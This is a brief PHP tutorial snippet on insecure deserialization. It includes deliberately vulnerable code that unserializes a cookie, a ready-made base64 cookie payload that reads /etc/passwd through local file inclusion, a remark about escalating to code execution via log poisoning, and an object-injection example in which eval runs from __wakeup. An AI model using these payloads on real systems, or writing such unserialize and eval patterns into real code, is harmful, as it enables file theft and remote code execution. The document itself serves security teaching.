//Valnurable code:

<?php
spl_autoload_register(function ($name){
    if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

if (empty($_COOKIE['PHPSESSID']))
{
    $page = new PageModel;
    $page->file = '/www/index.html'; //allows to make LFI by changing path, for example /etc/passwd

    setcookie(
        'PHPSESSID', 
        base64_encode(serialize($page)), 
        time()+60*60*24, 
        '/'
    );
} 

$cookie = base64_decode($_COOKIE['PHPSESSID']);
unserialize($cookie);

//PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30=
// <-> O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}
//Pay atention to the s parameter
//“s” represents a string.
//s:LENTH_OF_STRING:"ACTUAL_STRING";


//Futher escalation is available via RCE by Log poisoning
/////////////////////////////////////////////////////////////////////////////////

//PHP Object injection
class Example2
{
   private $hook = "phpinfo();";
}
print serialize(new Example2);

//above script generates object which could be injected into the script below

class Example2
{
  private $hook;   
  function __construct(){
      // some PHP code...
  }   
  function __wakeup(){
      if (isset($this->hook)) eval($this->hook);
  }
}
// some PHP code...
$user_data = unserialize($_COOKIE['data']);
